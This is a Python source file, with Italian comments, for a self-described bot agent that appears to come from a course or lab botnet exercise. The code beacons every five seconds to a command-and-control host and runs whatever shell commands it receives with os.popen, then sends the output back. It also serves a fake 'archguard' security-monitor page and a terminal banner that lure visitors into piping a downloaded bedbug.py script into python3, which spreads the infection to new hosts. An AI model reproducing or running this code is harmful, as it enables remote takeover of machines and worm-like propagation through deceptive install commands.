"""
ciao.py - Bot Agent (cs33)

Scaricato da bedbug.py via http://192.168.1.21:8081/ciao.py
Contatta sergio ogni 5 secondi (beaconing).
Apre seed server su :9090 con pagina bait per propagazione.

Avvio (automatico tramite bedbug.py):
  python3 ciao.py
"""

import urllib.request
import urllib.parse
import os
import time
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

SERGIO_HOST = "http://192.168.1.21:8080"
BEACON_INTERVAL = 5

now = datetime.now()
SEED_PORT = 10000 + int(now.strftime("%H%M"))   # es. 14:23 -> 11423
PAYLOAD_PORT = SEED_PORT + 1                     # es. 11424

BAIT_HTML = b"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>archguard - lightweight system monitor</title>
  <style>
    :root {
      --bg: #0f1117;
      --surface: #161b27;
      --border: #272d3d;
      --accent: #4f8ef7;
      --accent2: #7c3aed;
      --green: #22c55e;
      --text: #e2e8f0;
      --muted: #64748b;
      --warn: #f59e0b;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; min-height: 100vh; }

    /* NAV */
    nav {
      border-bottom: 1px solid var(--border);
      padding: 0 2rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 60px;
    }
    .logo { font-weight: 700; font-size: 1.1rem; letter-spacing: -0.5px; }
    .logo span { color: var(--accent); }
    .nav-links { display: flex; gap: 2rem; font-size: 0.9rem; color: var(--muted); }
    .nav-links a { color: var(--muted); text-decoration: none; }
    .nav-links a:hover { color: var(--text); }
    .badge { background: var(--accent2); color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 99px; font-weight: 600; }

    /* HERO */
    .hero { max-width: 760px; margin: 0 auto; padding: 80px 2rem 60px; text-align: center; }
    .pill {
      display: inline-flex; align-items: center; gap: 6px;
      background: rgba(79,142,247,0.1); border: 1px solid rgba(79,142,247,0.3);
      color: var(--accent); font-size: 0.78rem; padding: 4px 12px;
      border-radius: 99px; margin-bottom: 24px; font-weight: 500;
    }
    .pill-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
    h1 { font-size: 2.8rem; font-weight: 800; line-height: 1.15; letter-spacing: -1px; margin-bottom: 16px; }
    h1 em { font-style: normal; background: linear-gradient(90deg, var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .subtitle { color: var(--muted); font-size: 1.05rem; line-height: 1.6; max-width: 520px; margin: 0 auto 40px; }

    /* INSTALL BOX */
    .install-box {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 24px 28px;
      text-align: left;
      max-width: 560px;
      margin: 0 auto 16px;
    }
    .install-label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 12px; }
    .install-cmd {
      display: flex; align-items: center; justify-content: space-between; gap: 12px;
      background: var(--bg); border: 1px solid var(--border);
      border-radius: 8px; padding: 12px 16px;
    }
    .install-cmd code { color: var(--accent); font-size: 0.88rem; font-family: "SFMono-Regular", Consolas, monospace; user-select: all; }
    .copy-btn {
      background: var(--accent); color: #fff; border: none; border-radius: 6px;
      padding: 6px 14px; font-size: 0.8rem; cursor: pointer; white-space: nowrap; font-weight: 500;
    }
    .copy-btn:hover { opacity: 0.85; }
    .install-note { font-size: 0.78rem; color: var(--muted); text-align: center; }

    /* FEATURES */
    .features { max-width: 760px; margin: 60px auto; padding: 0 2rem; display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
    .feat { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
    .feat-icon { font-size: 1.4rem; margin-bottom: 10px; }
    .feat h3 { font-size: 0.9rem; font-weight: 600; margin-bottom: 6px; }
    .feat p { font-size: 0.82rem; color: var(--muted); line-height: 1.5; }

    /* FOOTER */
    footer { border-top: 1px solid var(--border); text-align: center; padding: 24px; font-size: 0.78rem; color: var(--muted); }
  </style>
</head>
<body>

<nav>
  <div class="logo">arch<span>guard</span></div>
  <div class="nav-links">
    <a href="#">Docs</a>
    <a href="#">GitHub</a>
    <a href="#">Changelog</a>
  </div>
  <span class="badge">v2.1.0</span>
</nav>

<div class="hero">
  <div class="pill"><span class="pill-dot"></span> Now with real-time threat detection</div>
  <h1>System monitor for<br><em>Arch Linux</em></h1>
  <p class="subtitle">Lightweight agent that watches your processes, network connections, and file integrity. Zero dependencies, one command install.</p>

  <div class="install-box">
    <div class="install-label">Quick Install</div>
    <div class="install-cmd">
      <code>curl -s http://SEED_IP:PAYLOAD_PORT/bedbug.py | python3</code>
      <button class="copy-btn" onclick="navigator.clipboard.writeText('curl -s http://SEED_IP:PAYLOAD_PORT/bedbug.py | python3');this.textContent='Copied!'">Copy</button>
    </div>
  </div>
  <p class="install-note">Requires Python 3.8+ &nbsp;|&nbsp; Arch Linux, Debian, Ubuntu</p>
</div>

<div class="features">
  <div class="feat">
    <div class="feat-icon">&#128268;</div>
    <h3>Process Monitor</h3>
    <p>Track CPU and memory usage per process in real time with minimal overhead.</p>
  </div>
  <div class="feat">
    <div class="feat-icon">&#128274;</div>
    <h3>File Integrity</h3>
    <p>Detect unauthorized changes to system files and get instant alerts.</p>
  </div>
  <div class="feat">
    <div class="feat-icon">&#127760;</div>
    <h3>Network Watch</h3>
    <p>Monitor open connections and flag suspicious outbound traffic automatically.</p>
  </div>
</div>

<footer>archguard &copy; 2024 &mdash; open source &mdash; MIT license</footer>

</body>
</html>"""

BAIT_TXT = """\033[32m
  arch-setup v1.2.3
  -----------------\033[0m

\033[33m[!] System security agent not found.\033[0m
    This system is not protected.

\033[37mTo install the security agent, run:\033[0m

    \033[36mcurl -s http://SEED_IP:PAYLOAD_PORT/bedbug.py | python3\033[0m

\033[90m(c) arch-setup project\033[0m
"""


# ---------------------------------------------------------------------------
# Seed server (:9090) - serve pagina bait + bedbug.py
# ---------------------------------------------------------------------------

class BaitHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            ua = self.headers.get("User-Agent", "")
            is_terminal = any(x in ua.lower() for x in ["curl", "wget", "python"])

            seed_ip = self.headers.get("Host", "SEED_IP").split(":")[0]
            port_str = str(PAYLOAD_PORT)

            if is_terminal:
                body = BAIT_TXT.replace("SEED_IP", seed_ip).replace("PAYLOAD_PORT", port_str).encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                html = BAIT_HTML.replace(b"SEED_IP", seed_ip.encode()).replace(b"PAYLOAD_PORT", port_str.encode())
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(html)))
                self.end_headers()
                self.wfile.write(html)
        else:
            self.send_response(404)
            self.end_headers()


class PayloadHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == "/bedbug.py":
            try:
                with open("bedbug.py", "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                print(f"[*] bedbug.py scaricato da {self.client_address[0]}")
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


def start_seed_server():
    server = HTTPServer(("0.0.0.0", SEED_PORT), BaitHandler)
    print(f"[*] Bait server su 0.0.0.0:{SEED_PORT}")
    server.serve_forever()


def start_payload_server():
    server = HTTPServer(("0.0.0.0", PAYLOAD_PORT), PayloadHandler)
    print(f"[*] Payload server su 0.0.0.0:{PAYLOAD_PORT}")
    server.serve_forever()


# ---------------------------------------------------------------------------
# Beacon
# ---------------------------------------------------------------------------

def heartbeat():
    try:
        with urllib.request.urlopen(f"{SERGIO_HOST}/heartbeat", timeout=5) as r:
            return r.read().decode().strip()
    except Exception as e:
        print(f"[!] Heartbeat fallito: {e}")
        return ""


def send_result(output):
    try:
        data = output.encode()
        req = urllib.request.Request(f"{SERGIO_HOST}/result", data=data, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"[!] Invio risultato fallito: {e}")


def run_command(cmd):
    try:
        result = os.popen(cmd).read()
        return result if result else "(nessun output)"
    except Exception as e:
        return f"(errore: {e})"


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

threading.Thread(target=start_seed_server, daemon=True).start()
threading.Thread(target=start_payload_server, daemon=True).start()

print(f"[*] Bot agent avviato beacon ogni {BEACON_INTERVAL}s verso {SERGIO_HOST}")

while True:
    cmd = heartbeat()
    if cmd:
        print(f"[>] Comando ricevuto: {cmd}")
        output = run_command(cmd)
        print(f"[<] Output: {output}")
        send_result(output)
    time.sleep(BEACON_INTERVAL)
